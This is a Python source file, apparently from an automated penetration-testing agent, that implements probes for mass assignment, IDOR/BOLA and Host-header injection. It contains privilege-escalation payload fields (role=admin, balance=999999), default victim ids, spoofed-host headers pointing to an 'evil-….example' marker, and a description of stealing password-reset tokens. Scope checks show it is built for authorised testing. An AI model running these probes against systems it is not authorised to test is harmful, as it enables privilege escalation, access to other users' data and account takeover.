"""
hellhound/core/tools/access_probes.py - access-control & request-tampering probes.

First slice of the agent.py split (see the agent-py-split-plan memory note). The
three executors below - mass_assign_probe, idor_probe, host_header_probe - plus
their private helpers/constants were lifted verbatim out of agent.py. Their ONLY
dependency back into agent.py is _execute_curl, reached through the _do_curl shim,
which imports it lazily (at call time, not module-import time) so tools/ and
agent.py never form an import cycle. agent.py re-imports every public name from
here, so `from hellhound.core.agent import _execute_idor_probe` (and the rest)
still resolves exactly as before.
"""
import json
import re
import time
import uuid
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qsl, urlencode

from hellhound.core.scope import is_in_scope, normalize_host
from hellhound.core.tasks import Target


def _do_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Lazy hop back to agent._execute_curl, deferred to call time so this module
    and agent.py don't import each other at load time."""
    from hellhound.core.agent import _execute_curl
    return _execute_curl(args, target, emit)


# Privilege/sensitive fields a write endpoint usually should NOT let the client
# set, mapped to an attacker-favourable value to inject. If any of these come
# BACK on a read of the object, the endpoint mass-assigns them (BOLA/privesc).
_MASS_ASSIGN_PROBES: Dict[str, Any] = {
    "role": "admin", "roles": "admin", "is_admin": True, "isAdmin": True, "admin": True,
    "is_staff": True, "is_superuser": True, "superuser": True, "is_root": True,
    "user_type": "admin", "account_type": "admin", "accountType": "admin", "type": "admin",
    "group": "admin", "groups": "admin", "level": 99, "access_level": 99,
    "balance": 999999, "credit": 999999, "credits": 999999, "wallet_balance": 999999, "points": 999999,
    "is_verified": True, "verified": True, "email_verified": True, "kyc_verified": True, "kyc": "verified",
    "is_active": True, "active": True, "enabled": True, "approved": True, "status": "active",
    "plan": "enterprise", "tier": "premium", "subscription": "premium", "premium": True,
    "permissions": "admin", "permission": "admin", "scope": "admin", "scopes": "admin",
    "privilege": "admin", "privileges": "admin", "can_admin": True, "owner": True,
    "discount": 100, "price": 0, "amount_due": 0,
}


def _ma_truthy(v: Any) -> bool:
    if isinstance(v, bool):
        return v
    return str(v).strip().lower() in ("1", "true", "yes", "on", "admin", "active", "premium", "enterprise", "verified")


def _ma_val_eq(a: Any, b: Any) -> bool:
    """Tolerant equality: True == 1 == 'true', 999999 == '999999', 'admin' == 'ADMIN'."""
    if isinstance(a, bool) or isinstance(b, bool):
        return _ma_truthy(a) == _ma_truthy(b)
    return str(a).strip().lower() == str(b).strip().lower()


def _ma_json(resp: Any) -> Optional[Dict[str, Any]]:
    if not isinstance(resp, dict):
        return None
    body = resp.get("body_preview") or resp.get("body") or ""
    try:
        obj = json.loads(body)
        return obj if isinstance(obj, dict) else None
    except Exception:
        return None


def _execute_mass_assign_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Tests a write endpoint for MASS ASSIGNMENT / auto-binding (a top-paying,
    highly-automatable BOLA/privesc class): does it blindly persist
    attacker-supplied privilege/sensitive fields (role, is_admin, balance,
    is_verified, plan, ...) that the client should never control?

    How it works: read the object (verify_url) BEFORE, send a write (url) that
    includes the caller's legitimate `base` fields PLUS a batch of privilege
    probe fields set to attacker-favourable values, then read the object AGAIN
    and report exactly which probe fields PERSISTED (came back changed to the
    injected value). Persistence — not just an HTTP 200 — is the proof: an
    endpoint that silently drops unknown fields returns 200 too.

    Runs under whatever session is active (capture_identity/swap_session) or a
    named `identity`, so you can prove a LOW-privilege user escalated
    themselves. Both URLs must be the same host; each is scope-checked here.
    Advisory — confirm the escalation's effect, then verify_finding +
    record_finding. It never records anything itself.
    """
    url = (args.get("url") or "").strip()
    if not url:
        return {"error": "mass_assign_probe needs 'url' — the write endpoint (e.g. POST/PUT /api/profile)."}
    method = str(args.get("method") or "POST").upper()
    if method not in ("POST", "PUT", "PATCH"):
        return {"error": f"mass_assign_probe method must be POST/PUT/PATCH (got {method}) — mass assignment is a write."}
    verify_url = (args.get("verify_url") or args.get("read_url") or "").strip() or url.split("?", 1)[0]
    as_form = str(args.get("content") or "json").lower() == "form"
    base = args.get("base") if isinstance(args.get("base"), dict) else {}
    identity = args.get("identity")

    # custom probe set, else the built-in privilege-field dictionary
    custom = args.get("fields")
    if isinstance(custom, dict) and custom:
        probes = dict(custom)
    elif isinstance(custom, list) and custom:
        probes = {str(f): _MASS_ASSIGN_PROBES.get(str(f), True) for f in custom}
    else:
        probes = dict(_MASS_ASSIGN_PROBES)

    # same-host + scope check for both URLs (defense in depth — the dispatcher
    # only gates the top-level 'url').
    w_host, _ = normalize_host(url if url.startswith(("http://", "https://")) else f"https://{url}")
    r_host, _ = normalize_host(verify_url if verify_url.startswith(("http://", "https://")) else f"https://{verify_url}")
    if w_host and r_host and w_host != r_host:
        return {"error": f"write host ('{w_host}') and verify host ('{r_host}') differ — both must be the same host."}
    if target and target.scope_rules and target.scope_rules.in_scope:
        for u in (url, verify_url):
            allowed, reason = is_in_scope(u, target.scope_rules)
            if not allowed:
                return {"error": f"SCOPE_VIOLATION: {reason}", "target": u, "blocked": True}

    def _curl(u, meth, payload=None):
        a = {"url": u, "method": meth, "isolate": bool(args.get("isolate"))}
        if identity:
            a["identity"] = identity
        if payload is not None:
            if as_form:
                a["body"] = "&".join(f"{k}={v}" for k, v in payload.items())
                a["headers"] = {"Content-Type": "application/x-www-form-urlencoded"}
            else:
                a["json"] = payload
        return _do_curl(a, target, emit)

    # identity resolution reuses response_diff's per-side identity support in
    # _execute_curl via the 'identity' arg, so no extra wiring needed here.
    before = _curl(verify_url, "GET")
    before_obj = _ma_json(before) or {}

    injected = dict(base)
    injected.update(probes)
    write_resp = _curl(url, method, injected)
    if isinstance(write_resp, dict) and write_resp.get("error"):
        return {"error": f"the write request failed: {write_resp['error']}", "url": url}

    after = _curl(verify_url, "GET")
    after_obj = _ma_json(after)

    write_status = write_resp.get("status_code") if isinstance(write_resp, dict) else None

    if after_obj is None:
        # No JSON object to confirm persistence against — report honestly.
        return {
            "status": "inconclusive",
            "write_status_code": write_status,
            "note": (
                f"Sent {len(probes)} privilege probe fields to {method} {url}, but the verify read of "
                f"{verify_url} didn't return a JSON object to confirm whether any persisted. Point verify_url "
                f"at the endpoint that echoes this object's current state (often a GET on the same path), or "
                f"check manually whether the injected role/is_admin/balance stuck."),
            "injected_fields": sorted(probes.keys()),
        }

    persisted = []
    for field, val in probes.items():
        if field in after_obj and _ma_val_eq(after_obj.get(field), val) and not _ma_val_eq(before_obj.get(field), val):
            persisted.append({"field": field, "injected": val, "now": after_obj.get(field),
                              "was": before_obj.get(field, "<absent>")})

    if persisted:
        hot = [p["field"] for p in persisted]
        summary = (f"MASS ASSIGNMENT confirmed — {method} {url} persisted attacker-supplied field(s): "
                   f"{', '.join(hot)}. These came back on a read set to the injected value, i.e. the client "
                   f"controlled fields it shouldn't. If any is a privilege field (role/is_admin/permissions) "
                   f"this is vertical privilege escalation; a balance/credit/discount field is financial. "
                   f"Confirm the escalated effect (e.g. now reach an admin-only endpoint), then verify_finding "
                   f"+ record_finding(kind='mass_assignment').")
        if emit and hasattr(emit, "warn"):
            emit.warn(f"[mass_assign_probe] {summary}")
    else:
        summary = (f"No mass assignment detected — none of the {len(probes)} privilege probe fields persisted "
                   f"on a read after {method} {url} (write returned HTTP {write_status}). The endpoint appears "
                   f"to ignore/allowlist unknown fields. Not a finding.")

    return {
        "status": "vulnerable" if persisted else "not_vulnerable",
        "method": method,
        "url": url,
        "verify_url": verify_url,
        "write_status_code": write_status,
        "persisted_fields": persisted,
        "injected_field_count": len(probes),
        "summary": summary,
    }


# Parameter names that typically carry a per-object/per-user identifier — the
# field an IDOR/BOLA lives in when the app trusts it without an ownership check.
_IDOR_PARAM_RE = re.compile(
    r"(^id$|_id$|^uid$|^pid$|^gid$|user|account|acct|customer|client|member|profile|"
    r"owner|order|invoice|doc|file|number|^ref$|^key$|^no$)", re.I)
# Default victim identifiers to try when the caller doesn't supply any.
_IDOR_DEFAULT_IDS = ["administrator", "admin", "carlos", "root", "0", "1", "2", "3"]
# Response language that means access was DENIED (so a 200-with-this isn't IDOR).
_IDOR_DENIED_RE = re.compile(
    r"access denied|not authori[sz]ed|unauthori[sz]ed|forbidden|permission denied|"
    r"you (?:do not|don'?t) have|not found|no such|does not exist|invalid (?:user|id|account)", re.I)


def _execute_idor_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Sweeps an id-like parameter for IDOR / BOLA: requests the SAME endpoint under
    YOUR current session but with the identifier changed to other users' values,
    and reports which substitutions returned a DIFFERENT 200 response (i.e. some
    other object/account's data) instead of being denied — the signal the app
    trusts the id without an ownership check.

    Give it a `url` whose query carries the id (e.g. .../my-account?id=wiener);
    it auto-detects the id parameter (override with `param`) and its own baseline
    value, fetches the baseline, then tries each candidate in `values` (default:
    common admin usernames + small integers, plus numeric neighbours of a numeric
    baseline). A candidate that returns HTTP 200 with a body that differs
    materially from the baseline and shows no access-denied language is flagged as
    a probable IDOR; if you pass `victim_marker` (a string unique to a victim's
    data) it's upgraded to confirmed when that marker appears. Runs the active
    identity (capture_identity/swap_session) or a named `identity`. Advisory —
    confirm with verify_finding(kind='idor') + record_finding. Same-host/scope
    checked. It never records anything itself.
    """
    from urllib.parse import urlencode
    url = (args.get("url") or "").strip()
    if not url:
        return {"error": "idor_probe needs 'url' — the endpoint whose id parameter to sweep (e.g. .../account?id=wiener)."}

    parsed = urlparse(url if url.startswith(("http://", "https://")) else f"https://{url}")
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    if not pairs:
        return {"error": "idor_probe needs an id in the URL query (e.g. ?id=123). For a path-based id "
                         "(/account/123), use response_diff/curl to vary the path segment instead."}

    # pick the id parameter: explicit, else the first id-like name, else the first param
    param = str(args.get("param") or "").strip()
    keys = [k for k, _ in pairs]
    if not param:
        param = next((k for k in keys if _IDOR_PARAM_RE.search(k)), keys[0])
    if param not in keys:
        return {"error": f"parameter '{param}' isn't in the URL query ({keys}).", "known_params": keys}
    baseline_val = next((v for k, v in pairs if k == param), "")

    identity = args.get("identity")
    method = str(args.get("method") or "GET").upper()

    # scope check (same host as the given url)
    host, _ = normalize_host(parsed.geturl())
    if target and target.scope_rules and target.scope_rules.in_scope:
        allowed, reason = is_in_scope(parsed.geturl(), target.scope_rules)
        if not allowed:
            return {"error": f"SCOPE_VIOLATION: {reason}", "target": parsed.geturl(), "blocked": True}

    # candidate victim ids
    values = args.get("values")
    if isinstance(values, list) and values:
        candidates = [str(v) for v in values]
    else:
        candidates = list(_IDOR_DEFAULT_IDS)
        if baseline_val.isdigit():  # a numeric id — try neighbours too
            n = int(baseline_val)
            candidates += [str(x) for x in (n - 1, n + 1, n - 2, n + 2) if x >= 0]
    candidates = [c for c in dict.fromkeys(candidates) if c != baseline_val]  # dedupe, drop own id

    victim_marker = str(args.get("victim_marker") or "").strip()

    def _fetch(val):
        q = urlencode([(k, (val if k == param else v)) for k, v in pairs])
        side_url = parsed._replace(query=q).geturl()
        a = {"url": side_url, "method": method, "isolate": bool(args.get("isolate"))}
        if identity:
            a["identity"] = identity
        return side_url, _do_curl(a, target, emit)

    _, base_resp = _fetch(baseline_val)
    base_body = str(base_resp.get("body_preview") or base_resp.get("body") or "") if isinstance(base_resp, dict) else ""
    base_status = base_resp.get("status_code") if isinstance(base_resp, dict) else None

    hits = []
    tested = []
    for val in candidates[:12]:
        side_url, resp = _fetch(val)
        if not isinstance(resp, dict):
            continue
        status = resp.get("status_code")
        body = str(resp.get("body_preview") or resp.get("body") or "")
        tested.append({"value": val, "status": status})
        if status != 200:
            continue
        denied = bool(_IDOR_DENIED_RE.search(body[:4000]))
        differs = body.strip() != base_body.strip() and len(body.strip()) > 40
        marker_hit = bool(victim_marker and victim_marker in body)
        if marker_hit or (differs and not denied):
            hits.append({
                "value": val, "status": status, "url": side_url,
                "victim_marker_present": marker_hit,
                "note": ("victim marker found in response" if marker_hit
                         else "returned a different 200 body than your own id (likely another object's data)"),
            })

    if hits:
        summary = (f"Probable IDOR/BOLA on '{param}' — {len(hits)} substituted id(s) returned another "
                   f"object's data under your own session: {', '.join(h['value'] for h in hits)}. "
                   f"The endpoint trusts '{param}' without an ownership check. Confirm with "
                   f"verify_finding(kind='idor', victim_marker=<something unique to that victim>) then record_finding.")
        if emit and hasattr(emit, "warn"):
            emit.warn(f"[idor_probe] {summary}")
    else:
        summary = (f"No IDOR detected on '{param}' — none of the {len(tested)} substituted ids returned a "
                   f"distinct accessible 200 (all matched your own data, were denied, or errored). "
                   f"If the id space is unpredictable (UUIDs/GUIDs), supply real victim ids via 'values'.")

    return {
        "status": "vulnerable" if hits else "not_vulnerable",
        "param": param,
        "baseline_value": baseline_val,
        "baseline_status": base_status,
        "hits": hits,
        "tested": tested,
        "summary": summary,
    }


# Header names an app might trust as "the host the user came in on" when it
# builds absolute links (password-reset URLs, email confirmations), decides a
# redirect target, or keys a cache entry. Each is a classic Host-header-injection
# vector; Host itself is the strongest (the app wholesale trusts the Host line).
_HOST_INJECT_VECTORS = (
    ("Host", "Host"),
    ("X-Forwarded-Host", "X-Forwarded-Host"),
    ("X-Host", "X-Host"),
    ("X-Forwarded-Server", "X-Forwarded-Server"),
    ("X-HTTP-Host-Override", "X-HTTP-Host-Override"),
    ("Forwarded", "Forwarded"),  # RFC 7239: Forwarded: host=evil
)


def _host_injection_hits(marker: str, status_code: Any, resp_headers: Dict[str, Any],
                         body: str) -> List[Dict[str, Any]]:
    """Pure detector: given one response to a Host-poisoned request, report every
    place the attacker-controlled marker host came back out — ranked by how
    exploitable that reflection is. No network, so it's unit-testable in isolation.

      - in a Location/redirect header           -> redirect target is attacker-set
      - in a URL/link context in the body       -> absolute links built from Host
                                                    (password-reset-link poisoning,
                                                     web-cache poisoning)
      - in a Set-Cookie Domain=                  -> cookie scoped to attacker host
      - bare in the body                         -> Host reflected (weaker on its own)
    """
    marker = (marker or "").lower()
    if not marker:
        return []
    hits: List[Dict[str, Any]] = []
    headers = {str(k).lower(): str(v) for k, v in (resp_headers or {}).items()}
    body = body or ""
    body_l = body.lower()

    # 1. redirect / Location header — the app is sending the victim to our host
    loc = headers.get("location", "")
    if marker in loc.lower():
        hits.append({"where": "location_header", "confidence": "high",
                     "evidence": f"Location: {loc[:200]}",
                     "impact": "open redirect / routing to attacker host via Host header"})

    # 2. Set-Cookie Domain scoped to the attacker host
    sc = headers.get("set-cookie", "")
    if re.search(r"domain=\s*\.?" + re.escape(marker), sc, re.I):
        hits.append({"where": "set_cookie_domain", "confidence": "high",
                     "evidence": f"Set-Cookie: {sc[:200]}",
                     "impact": "session cookie scoped to attacker-controlled domain"})

    # 3. marker inside a URL/link context in the body — the money shot for
    # password-reset poisoning: a reset/confirm link is built from the Host.
    for m in re.finditer(r"(https?:)?//" + re.escape(marker) + r"[^\s\"'<>]*", body_l):
        snippet = body[max(0, m.start() - 40): m.end() + 10]
        hits.append({"where": "body_url", "confidence": "high",
                     "evidence": f"...{snippet.strip()[:200]}...",
                     "impact": "absolute URL/link built from the Host header "
                               "(password-reset-link poisoning / web-cache poisoning)"})
        break  # one is enough to prove it; don't spam identical hits

    # 4. bare reflection in the body (no URL context) — real but weaker alone
    if not any(h["where"] == "body_url" for h in hits) and marker in body_l:
        idx = body_l.find(marker)
        snippet = body[max(0, idx - 40): idx + len(marker) + 40]
        hits.append({"where": "body_text", "confidence": "low",
                     "evidence": f"...{snippet.strip()[:200]}...",
                     "impact": "Host reflected into the response body (confirm it reaches a "
                               "link/redirect/cache key to matter)"})
    return hits


def _execute_host_header_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Tests an endpoint for Host-header injection: re-sends the request with the
    host identity (Host, X-Forwarded-Host, X-Host, …) overridden to an
    attacker-controlled marker, and reports every vector whose marker comes back
    out in a redirect, an absolute link in the body, or a cookie domain.

    This is the engine behind password-reset-link poisoning (the reset email's
    link is built from the Host the app trusted), web-cache poisoning, and some
    routing-based SSRF. Point it at a link-generating endpoint — a password-reset
    / "forgot password" POST is the classic — with `url` (and `method`/`body` for
    a POST). Optional `marker` overrides the injected host. It sends to the REAL
    host on the wire (the marker only ever rides in a header), so it never leaves
    scope. Advisory only — confirm the end-to-end impact (e.g. the poisoned link
    actually lands in the victim's email / cache) and record_finding it yourself.
    Same-host/scope checked. Records nothing itself.
    """
    url = (args.get("url") or "").strip()
    if not url:
        return {"error": "host_header_probe needs 'url' — the endpoint to test (ideally a link-generating "
                         "one like a password-reset / forgot-password POST)."}
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    parsed = urlparse(url)

    if target and target.scope_rules and target.scope_rules.in_scope:
        allowed, reason = is_in_scope(url, target.scope_rules)
        if not allowed:
            return {"error": f"SCOPE_VIOLATION: {reason}", "target": url, "blocked": True}

    method = str(args.get("method") or "GET").upper()
    marker = str(args.get("marker") or "").strip() or f"evil-{uuid.uuid4().hex[:8]}.example"
    real_host = parsed.netloc

    # build the shared body/identity args once; vectors only change one header
    base_a: Dict[str, Any] = {"url": url, "method": method}
    for k in ("json", "body", "data", "cookies", "cookie", "identity", "isolate"):
        if args.get(k) is not None:
            base_a[k] = args.get(k)

    vectors_hit: List[Dict[str, Any]] = []
    tested: List[str] = []
    for label, header_name in _HOST_INJECT_VECTORS:
        hv = f"host={marker}" if header_name == "Forwarded" else marker
        a = dict(base_a)
        # For X-* vectors keep the real Host (app still routes) and add the
        # spoofed hint; for the Host vector, override Host outright.
        extra = {header_name: hv}
        if header_name != "Host":
            extra["Host"] = real_host
        a["headers"] = extra
        res = _do_curl(a, target, emit)
        tested.append(label)
        if not isinstance(res, dict) or res.get("error"):
            continue
        hits = _host_injection_hits(
            marker, res.get("status_code"), res.get("headers") or {}, res.get("body_preview") or "")
        for h in hits:
            h["vector"] = label
            vectors_hit.append(h)

    # strongest first
    _rank = {"high": 0, "low": 1}
    vectors_hit.sort(key=lambda h: _rank.get(h.get("confidence"), 9))

    if vectors_hit:
        top = vectors_hit[0]
        summary = (f"Host-header injection: marker host reflected via "
                   f"{', '.join(sorted({h['vector'] for h in vectors_hit}))} "
                   f"({top['where']}, {top['confidence']} confidence). "
                   f"{top['impact']}.")
        note = ("If this endpoint generates a link that reaches a user (password-reset email, "
                "confirmation link), this is password-reset poisoning: request a reset for the victim "
                "with the poisoned Host, then read the attacker-host access log for the leaked token. "
                "If the reflection lands in a cacheable response, it's web-cache poisoning instead.")
    else:
        summary = (f"No Host-header injection seen: the marker host never came back in a redirect, "
                   f"an absolute link, or a cookie domain across {len(tested)} vectors.")
        note = ("The app didn't echo the Host into a link/redirect here. Try a genuinely link-generating "
                "endpoint (forgot-password / email-confirmation POST) if you haven't, or a known "
                "cacheable page for cache poisoning.")

    return {
        "status": "ok",
        "url": url,
        "marker_host": marker,
        "vectors_tested": tested,
        "hits": vectors_hit,
        "summary": summary,
        "note": note,
    }


